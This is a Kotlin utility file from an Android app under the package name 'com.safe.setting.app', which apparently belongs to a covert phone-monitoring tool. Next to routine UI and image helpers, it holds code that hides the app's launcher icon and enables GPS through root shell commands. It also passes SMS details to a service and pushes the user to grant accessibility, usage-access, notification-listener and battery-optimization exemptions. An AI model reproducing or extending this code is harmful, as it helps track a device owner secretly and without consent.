package com.safe.setting.app.utils

import android.annotation.SuppressLint
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.MediaStore
import android.provider.Settings
import android.view.View
import android.view.ViewTreeObserver
import android.view.WindowManager
import android.view.inputmethod.InputMethodManager
import android.widget.ImageView
import androidx.annotation.IdRes
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.content.res.AppCompatResources
import androidx.constraintlayout.widget.ConstraintLayout
import com.bumptech.glide.GenericTransitionOptions
import com.bumptech.glide.Glide
import com.bumptech.glide.load.engine.DiskCacheStrategy
import com.bumptech.glide.request.RequestOptions
import com.google.android.material.appbar.AppBarLayout
import com.safe.setting.app.ui.activities.login.LoginActivity
import com.safe.setting.app.utils.async.AsyncTaskRootPermission
import com.safe.setting.app.utils.async.AsyncTaskRunCommand
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import com.safe.setting.app.ui.widget.toolbar.CustomToolbar

@Suppress("DEPRECATION")
object ConstFun {


    fun getRandomNumeric() : String = System.currentTimeMillis().toString()
    inline fun <reified V : View> View.find(@IdRes id: Int): V = findViewById(id)
    @SuppressLint("ObsoleteSdkInt")
    fun isAndroidM(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
    private fun isAndroidO() : Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O

    fun Context.setVibrate(milliseconds: Long) {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (isAndroidO()) {
            vibrator.vibrate(VibrationEffect.createOneShot(milliseconds, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(milliseconds)
        }
    }

    // **** बदला हुआ कोड: kandroid.startActivity को मानक Intent से बदलें ****
    inline fun <reified T : Any> Activity.startAnimateActivity(enterAnim:Int, exitAnim:Int) {
        startActivity(Intent(this, T::class.java))
        finish()
        animateActivity(enterAnim,exitAnim)
    }

    // **** बदला हुआ कोड: kandroid.IntentFor को मानक Intent से बदलें ****
    inline fun <reified S : Any> Context.startServiceSms(smsAddress:String,smsBody:String,type:Int){
        val myIntent = Intent(this, S::class.java)
        myIntent.putExtra(Consts.SMS_ADDRESS,smsAddress)
        myIntent.putExtra(Consts.SMS_BODY,smsBody)
        myIntent.putExtra(Consts.TYPE_SMS,type)
        startService(myIntent)
    }

    fun Activity.animateActivity(enterAnim:Int, exitAnim:Int) = overridePendingTransition(enterAnim, exitAnim)

    @SuppressLint("IntentReset")
    fun Activity.openGallery() = Intent(Intent.ACTION_PICK,MediaStore.Images.Media.EXTERNAL_CONTENT_URI).also {
        it.flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        it.type = "image/*"
        startActivityForResult(it,100)
    }

    // **** बदला हुआ कोड: kandroid.isShow को View.visibility से बदलें ****
    fun View.isShow(state: Boolean) {
        visibility = if (state) View.VISIBLE else View.GONE
    }

    fun Context.openAppSystemSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        startActivity(intent)
    }

    @Suppress("CAST_NEVER_SUCCEEDS")
    fun runThread(sleep: Long, action: () -> Unit): Thread = Thread {
        while (true) {
            try {
                Thread.sleep(sleep)
                (this as? Activity)?.runOnUiThread { action() }
            } catch (e: InterruptedException) {
                break
            }
        }
    }

    fun getDateTime(): String {
        val dateFormat = SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.US)
        return dateFormat.format(Calendar.getInstance().time)
    }

    fun Context.alertDialog(v:View,cancellable: Boolean = false) : AlertDialog =
        AlertDialog.Builder(this).setView(v)
            .setCancelable(cancellable).create()

    fun ImageView.setImageUrl(url: String, placeholder: Int) {
        Glide.with(this).load(url)
            .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
            .apply(RequestOptions()
                .diskCacheStrategy(DiskCacheStrategy.ALL)
                .placeholder(AppCompatResources.getDrawable(context, placeholder))
            )
            .into(this)
    }

    fun ImageView.setImageId(drawable:Int){
        Glide.with(this).load(drawable)
            .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
            .apply(RequestOptions().diskCacheStrategy(DiskCacheStrategy.ALL))
            .into(this)
    }

    fun convertCurrentDuration(currentDuration: Long): String {
        val seconds = (currentDuration % 60000 / 1000).toString()
        val minutes = (currentDuration / 60000).toString()
        return if (seconds.length == 1) "$minutes:0$seconds" else "$minutes:$seconds"
    }

    fun Context.openAccessibilitySettings() = startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))

    fun Context.openUseAccessSettings() = startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))

    fun Context.openNotificationListenerSettings(){
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivity(intent)
    }

    fun Context.openWhitelistSettings() {
        if (isAndroidM()) {
            if (!isIgnoringBatteryOptimizations()) {
                showBatteryOptimizationDialog()
            }
        }
    }

    private fun Context.showBatteryOptimizationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Battery Optimization")
            .setMessage("To ensure uninterrupted use of our app, please disable battery optimization for our app.")
            .setPositiveButton("Go to Settings") { _, _ ->
                openBatteryOptimizationSettings()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun Context.openBatteryOptimizationSettings() {
        val intent = Intent().apply {
            action = Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS
        }

        try {
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun Context.isIgnoringBatteryOptimizations(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager?
        return powerManager?.isIgnoringBatteryOptimizations(packageName) ?: false
    }

    fun isRoot() : Boolean {
        if (Build.TAGS != null && Build.TAGS.contains("test-keys")) return true
        val patch = arrayOf("/su/bin","/sbin", "/system/bin", "/system/sbin", "/system/xbin", "/data/local/xbin",
            "/data/local/bin", "/system/sd/xbin", "/system/bin/failsafe", "/vendor/bin", "/data/local")
        var result = false
        for (element in patch) if (File("$element/su").exists()){ result = true ; break }
        return result
    }

    fun Context.permissionRoot(result:(result:Boolean)->Unit) =
        AsyncTaskRootPermission(this){ result(it) }.execute()

    fun enableGpsRoot() = AsyncTaskRunCommand(onPostFunc = { enableNetworkProviderRoot() }).execute(Consts.COMMAND_ENABLE_GPS_PROVIDER)
    private fun enableNetworkProviderRoot() = AsyncTaskRunCommand().execute(Consts.COMMAND_ENABLE_NETWORK_PROVIDER)

    fun Context.showApp(state:Boolean){
        val componentName = ComponentName(this, LoginActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName,
            if (state) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
    }

    fun Context.isNotificationServiceRunning() : Boolean {
        val enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName)
    }

    fun Context.isAddWhitelist() : Boolean =
        if (isAndroidM()) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            powerManager.isIgnoringBatteryOptimizations(packageName)
        }
        else true

    fun View.showKeyboard(show:Boolean){
        val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
        if (show) imm.showSoftInput(this, InputMethodManager.SHOW_IMPLICIT)
        else imm.hideSoftInputFromWindow(this.windowToken, 0)
    }

    fun contentGlobalLayout(content: ConstraintLayout, appBar: AppBarLayout){
        content.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener{
            override fun onGlobalLayout() {
                content.viewTreeObserver.removeOnGlobalLayoutListener(this)
                val appbarHeight = appBar.height
                content.translationY = -appbarHeight.toFloat()
                val params = content.layoutParams
                params.height = content.height + appbarHeight
                content.layoutParams = params
            }
        })
    }

    fun Context.adjustFontScale() {
        val configuration = resources.configuration
        if (configuration.fontScale > 1) {
            configuration.fontScale = 0.85f
            val metrics = resources.displayMetrics
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                windowManager.currentWindowMetrics.bounds
            } else {

                windowManager.defaultDisplay.getMetrics(metrics)
            }
            metrics.scaledDensity = configuration.fontScale * resources.displayMetrics.density
            resources.updateConfiguration(configuration, metrics)
        }
    }

    fun isScrollToolbar(toolbar: CustomToolbar, state: Boolean){
        val params = toolbar.layoutParams as AppBarLayout.LayoutParams
        if (state) params.scrollFlags = AppBarLayout.LayoutParams.SCROLL_FLAG_SCROLL or AppBarLayout.LayoutParams.SCROLL_FLAG_ENTER_ALWAYS
        else params.scrollFlags = 0
    }
}
